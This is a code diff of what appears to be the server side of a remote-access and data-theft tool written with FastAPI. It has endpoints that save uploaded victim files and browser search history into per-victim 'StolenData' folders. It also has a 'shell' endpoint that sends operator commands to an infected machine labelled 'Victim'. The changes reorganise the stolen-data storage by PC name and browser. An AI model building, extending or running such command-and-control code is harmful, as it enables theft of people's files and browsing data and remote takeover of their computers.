@@ -105,8 +105,9 @@ def show_text_in_editor(filename, text):
 
 
 class BrowserHistory(BaseModel):
-    DATA:str
-    PCNAME:str
+    data:dict
+    Pc_Name:str
+    Browser_Name:str
 
 class TextPayload(BaseModel):
     file_name:str
@@ -116,16 +117,30 @@ class imgt(BaseModel):
     file_name:str
     data:str
 
+class JUSTHENAME(BaseModel):
+    Name:str
 app = FastAPI()
 
 
-@app.post("/api/recive/payload",status_code=200)
-async def recivePaylaod(File_param:UploadFile):
+@app.post("/api/recive/payload/{name}",status_code=200)
+async def recivePaylaod(File_param:UploadFile,name:str):
     try:
-        os.mkdir(os.getcwd()+"/StolenFiles")
+        os.mkdir(os.getcwd()+"/StolenData")
     except:
         pass
-    with open(f"{os.getcwd()}/StolenFiles/{File_param.filename}",'wb') as f:
+
+    try:
+        os.mkdir(os.getcwd()+f"/StolenData/{name}")
+    except:
+        pass
+
+    
+    try:
+        os.mkdir(os.getcwd()+f"/StolenData/{name}/Files")
+    except:
+        pass
+
+    with open(f"{os.getcwd()}/StolenData/{name}/Files/{File_param.filename}",'wb') as f:
         contents = await File_param.read()
         f.write(contents)
 
@@ -150,22 +165,27 @@ async def reciveText(text:TextPayload):
 @app.post("/api/recive/browser/history",status_code=200)
 def recivehistory(DATA:BrowserHistory):
     try:
-        os.mkdir(os.getcwd()+"/StolenFiles")
+        os.mkdir(os.getcwd()+"/StolenData")
     except:
         pass
 
     try:
-        os.mkdir(os.getcwd()+"/StolenFiles/BrowserData")
+        os.mkdir(os.getcwd()+f"/StolenData/{DATA.Pc_Name}")
     except:
         pass
 
     try:
-        os.mkdir(os.getcwd()+f"/StolenFiles/BrowserData/{DATA.PCNAME}")
+        os.mkdir(os.getcwd()+f"/StolenData/{DATA.Pc_Name}/BrowserData")
     except:
         pass
-    data = json.loads(DATA.DATA)
-    with open(f'{os.getcwd()}/StolenFiles/BrowserData/BrowserHistory.json', 'w', encoding='utf-8') as f:
-        json.dump(data, f, ensure_ascii=False, indent=4)
+
+
+    try:
+        os.mkdir(os.getcwd()+f"/StolenData/{DATA.Pc_Name}/BrowserData/SearchHistory")
+    except:
+        pass
+    with open(f'{os.getcwd()}/StolenData/{DATA.Pc_Name}/BrowserData/SearchHistory/{DATA.Browser_Name}_History.json', 'w', encoding='utf-8') as f:
+        json.dump(DATA.data, f,indent=4,sort_keys=True)
 
 
 class Logs(BaseModel):
@@ -185,9 +205,9 @@ def savetologs(log:Logs):
         print(e)
 
 
-@app.get("/api/commands/recive/{pcname}")
-def shell(pcname:str):
-    res = input_dialog(title=f"Started a shell with the Victim[ {pcname} ]",message="you commands")
+@app.get("/api/commands/recive/{Pc_Name}")
+def shell(Pc_Name:str):
+    res = input_dialog(title=f"Started a shell with the Victim[ {Pc_Name} ]",message="you commands")
     print(res)
     return {"CMD":str(res)}
 
@@ -202,5 +222,4 @@ async def upload_image(file: UploadFile = File(...)):
     image = Image.open(io.BytesIO(contents))
     image.save(f"{file.filename}")
     return {"filename": file.filename}
-""" 
-uvicorn.run(app, host="0.0.0.0", port=8000)
+"""
